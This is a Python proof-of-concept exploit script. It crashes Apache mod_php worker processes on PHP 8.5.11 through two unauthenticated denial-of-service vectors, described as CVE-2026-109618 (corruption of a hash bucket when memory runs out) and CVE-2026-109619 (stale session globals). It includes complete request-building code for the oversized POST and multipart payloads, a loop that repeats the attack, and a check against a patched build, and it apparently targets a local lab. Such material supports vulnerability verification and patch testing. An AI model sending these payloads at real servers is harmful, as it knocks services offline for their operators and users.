#!/usr/bin/env python3
"""php2shell — deterministic worker crash PoC (Apache mod_php, DoS arm).

Two independent vectors, both unauthenticated, both pre-script, both
deterministic on the vulnerable build (PHP 8.5.11) and both survived by the
fixed build (PHP 8.5.12). Evidence per round is the X-Worker-PID change
(Apache prefork respawns the dead child) plus the torn-down connection.

Vector `bucket` — CVE-2026-109618 (OOM corruption):
  A urlencoded POST `=[276 B garbage]&a=1&<3.5 MiB name>[x]=1` registers the
  oversized array-syntax field through php_std_post_handler() ->
  php_register_variable_ex() -> zend_symtable_str_update_ind() ->
  _zend_hash_str_add_or_update_i(). The hash counters (nNumUsed,
  nNumOfElements) are incremented BEFORE the key's zend_string_init()
  allocation; when that allocation exceeds memory_limit, 8.5.11 longjmp()s
  out between the two — the bucket is visible to teardown but never
  initialized. Request shutdown destroys $_POST, interprets the stale bytes
  as a zval (the garbage from the empty-name field value), and segfaults.
  The response connection dies with no reply; Apache logs
  `AH00052: child pid ... exit signal Segmentation fault (11)`.
  Fixed 8.5.12: the soft-OOM defer (fix 31c0ea7d7ff1) keeps the failing
  insertion fallible (HASH_NOMEM) instead of bailing out mid-operation —
  the fatal error is served as a normal 200 response and the worker lives.

Vector `session` — CVE-2026-109619 (stale global state):
  producer  = multipart with PHP_SESSION_UPLOAD_PROGRESS + file part (the
              rfc1867 FILE_START callback publishes PS(id) and
              PS(http_session_vars) before modules are activated) + a 17 MiB
              field value that OOMs the parse mid-body. On mod_php, request
              shutdown frees the request heap while those session globals
              still point into it (module RSHUTDOWN was skipped:
              PG(modules_activated) == 0).
  consumer  = multipart WITHOUT a file part. MULTIPART_EVENT_END reaches
              php_session_rfc1867_cleanup() -> php_session_initialize(),
              which consumes the dangling PS(id)/PS(http_session_vars) as
              live state and kills the worker. No groom is sent — this is
              the raw consumption crash (poc/diagnose.py adds the 16 KiB
              reclaim groom to survive it and read the oracle instead).
  Fixed 8.5.12: shutdown resets the session globals; the consumer serves
  normally (Set-Cookie with a fresh session id, script output).

Result protocol:
  CRASH-RESULT: WORKER-KILLED n/m vector=<name> (vulnerable)
  CRASH-RESULT: NOT-REPRODUCED n/m vector=<name>
  CRASH-FAIL: ...
Exit codes: 0 = deterministic kill demonstrated, 1 = not reproduced,
2 = error.

Usage:
  python3 poc/crash.py                                     # both vectors, vuln host
  python3 poc/crash.py --vector bucket --rounds 3
  python3 poc/crash.py --check-fixed                       # + fixed-host survival
"""

import argparse
import binascii
import os
import re
import socket
import sys
import time

BOUNDARY = b"----php2shell-crash"
FILL_BYTES = 17 << 20
LONG_NAME = 3500032            # Datadog's observed oversized-field size
VALUE_BYTES = 276              # lands in the 320 B size class (bucket groom)

RE_OOM = re.compile(rb"Allowed memory size of \d+ bytes exhausted")


class Conn:
    def __init__(self, host, port, timeout=90):
        self.host, self.port, self.timeout = host, port, timeout

    def request(self, method, path, headers, body=b"", retries=3):
        for _ in range(retries):
            try:
                parts = [f"{method} {path} HTTP/1.1\r\nHost: crash\r\n"
                         f"Connection: close\r\n"]
                for k, v in headers:
                    parts.append(f"{k}: {v}\r\n")
                parts.append(f"Content-Length: {len(body)}\r\n\r\n")
                s = socket.create_connection((self.host, self.port),
                                             timeout=self.timeout)
                s.sendall("".join(parts).encode() + body)
                data = b""
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                s.close()
                return data
            except OSError:
                time.sleep(0.7)
        return b""

    def worker_pid(self):
        r = self.request("GET", "/", [])
        for line in r.split(b"\r\n"):
            if line.lower().startswith(b"x-worker-pid:"):
                return line.split(b":")[1].strip().decode()
        return None


def part(name, value, filename=None):
    cd = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename:
        cd += b'; filename="' + filename + b'"\r\n' \
              b'Content-Type: application/octet-stream'
    return b"--" + BOUNDARY + b"\r\n" + cd + b"\r\n\r\n" + value + b"\r\n"


def bucket_attack(conn):
    """One urlencoded OOM-bucket trigger. Returns (pid_before, pid_after,
    reply) — pid change or empty reply means the child died."""
    pid_before = conn.worker_pid()
    body = (b"=" + b"\xde\xad\xbe\xef" * (VALUE_BYTES // 4)
            + b"&a=1&" + b"A" * LONG_NAME + b"[x]=1")
    r = conn.request("POST", "/",
                     [("Content-Type", "application/x-www-form-urlencoded")],
                     body)
    time.sleep(0.4)     # give Apache a beat to respawn before asking the pid
    pid_after = conn.worker_pid()
    return pid_before, pid_after, r


def session_attack(conn):
    """Producer + ungroomed consumer. Returns (pid_before, pid_after,
    producer_reply, consumer_reply)."""
    sid = binascii.hexlify(os.urandom(16))
    ck = ("Cookie", "PHPSESSID=" + sid.decode())
    ct = ("Content-Type", "multipart/form-data; boundary=" + BOUNDARY.decode())
    pid_before = conn.worker_pid()
    producer = (part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p")
                + part(b"f", b"X", filename=b"x.txt")
                + part(b"z", b"V" * FILL_BYTES)
                + b"--" + BOUNDARY + b"--\r\n")
    r1 = conn.request("POST", "/", [ct, ck], producer)
    consumer = (part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p")
                + part(b"z", b"1")
                + b"--" + BOUNDARY + b"--\r\n")
    r2 = conn.request("POST", "/", [ct, ck], consumer)
    time.sleep(0.4)
    pid_after = conn.worker_pid()
    return pid_before, pid_after, r1, r2


def died(pid_before, pid_after, reply):
    return pid_before != pid_after or not reply


def survived_with_oom_error(reply):
    return bool(reply) and RE_OOM.search(reply) is not None


def run_vector(conn, label, vector, rounds):
    kills = 0
    for i in range(rounds):
        if vector == "bucket":
            pb, pa, r = bucket_attack(conn)
            detail = (f"pid {pb}->{pa} reply={'yes' if r else 'none'}"
                      + (f" oom_served={'yes' if survived_with_oom_error(r) else 'no'}"
                         if r else ""))
        else:
            pb, pa, r1, r2 = session_attack(conn)
            detail = (f"pid {pb}->{pa} producer={'oom' if RE_OOM.search(r1) else 'ok'} "
                      f"consumer_reply={'yes' if r2 else 'none'}")
        if died(pb, pa, r if vector == "bucket" else r2):
            kills += 1
            print(f"CRASH: [{label}] round {i + 1}/{rounds} vector={vector} "
                  f"WORKER-KILLED ({detail})")
        else:
            print(f"CRASH: [{label}] round {i + 1}/{rounds} vector={vector} "
                  f"survived ({detail})")
    return kills


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=29555)
    ap.add_argument("--vector", choices=["bucket", "session", "both"],
                    default="both")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--check-fixed", action="store_true",
                    help="also run the identical attack against the fixed "
                         "host (must survive every round)")
    ap.add_argument("--fixed-host", default="127.0.0.1")
    ap.add_argument("--fixed-port", type=int, default=29556)
    args = ap.parse_args()

    conn = Conn(args.host, args.port)
    if conn.worker_pid() is None:
        print("CRASH-FAIL: no X-Worker-PID header; not the php2shell lab "
              "target")
        return 2

    vectors = ["bucket", "session"] if args.vector == "both" else [args.vector]
    ok = True
    for v in vectors:
        kills = run_vector(conn, f"{args.host}:{args.port}", v, args.rounds)
        if kills == args.rounds:
            print(f"CRASH-RESULT: WORKER-KILLED {kills}/{args.rounds} "
                  f"vector={v} (vulnerable)")
        else:
            print(f"CRASH-RESULT: NOT-REPRODUCED {kills}/{args.rounds} "
                  f"vector={v}")
            ok = False

    if args.check_fixed:
        fixed = Conn(args.fixed_host, args.fixed_port)
        if fixed.worker_pid() is None:
            print("CRASH-FAIL: fixed host unreachable or not the lab target")
            return 2
        for v in vectors:
            kills = run_vector(fixed, f"{args.fixed_host}:{args.fixed_port}",
                               v, args.rounds)
            if kills == 0:
                print(f"CRASH-RESULT: SURVIVED 0/{args.rounds} vector={v} "
                      f"(fixed — identical attack, worker stable)")
            else:
                print(f"CRASH-RESULT: FIXED-HOST-KILLED {kills}/{args.rounds} "
                      f"vector={v} — UNEXPECTED")
                ok = False

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
